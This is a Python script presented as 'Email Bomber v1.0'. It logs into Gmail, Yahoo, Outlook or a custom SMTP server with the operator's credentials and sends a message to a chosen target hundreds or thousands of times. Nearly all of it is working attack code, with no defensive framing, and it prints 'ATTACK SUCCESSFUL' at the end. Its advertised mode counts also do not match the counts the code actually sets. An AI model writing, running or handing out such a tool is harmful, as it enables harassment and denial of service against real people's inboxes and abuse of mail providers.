import smtplib
import sys
import colorama
from colorama import Fore,Style
from traitlets import default
colorama.init(autoreset=True)

def intro():
    print(Style.BRIGHT+Fore.RED+"===>Email Bomber v1.0<===",Style.BRIGHT+"""
 _____ __  __    _    ___ _       ____   ___  __  __ ____  _____ ____  
| ____|  \/  |  / \  |_ _| |     | __ ) / _ \|  \/  | __ )| ____|  _ \ 
|  _| | |\/| | / _ \  | || |     |  _ \| | | | |\/| |  _ \|  _| | |_) |
| |___| |  | |/ ___ \ | || |___  | |_) | |_| | |  | | |_) | |___|  _ <     
|_____|_|  |_/_/   \_\___|_____| |____/ \___/|_|  |_|____/|_____|_| \_\   
                                                ""","\n",Style.BRIGHT + Fore.RED + "                                                    Author : Vijayaraam")



class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(Fore.GREEN + 'Tool Active..')
            self.target = str(input(Fore.RED + 'Enter Target Email ==> '))
            self.mode = int(input(Fore.RED + 'Select a Mode [1:(2000),2:(1000),3:(500),4:(custom)] : '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(Fore.GREEN + 'Bombing ...')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(Fore.RED + 'Input a Quantity ==> '))
            print(Fore.GREEN + f'You have chose {self.mode} and {self.amount} emails')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(Fore.GREEN + 'Email Framework....')
            self.server = str(input(Fore.RED + 'Select an Option [1:(Gmail),2:(Yahoo),3:(Outlook),4:(custom)] : '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(Fore.RED + 'Enter port number ==> '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(Fore.RED + 'Enter Your Email ID ==> '))
            self.fromPwd = str(input(Fore.RED + 'Enter Your Password ==> '))
            self.subject = str(input(Fore.RED + 'Enter Subject ==> '))
            self.message = str(input(Fore.RED + 'Enter Message ==> '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f"ERROR: {e}")

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count+=1
            print(Fore.YELLOW + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(Fore.GREEN + 'Attacking.....')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(Fore.GREEN + '[[[[[ATTACK SUCCESSFUL]]]]]')
        sys.exit(0)


if __name__=='__main__':
    intro()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()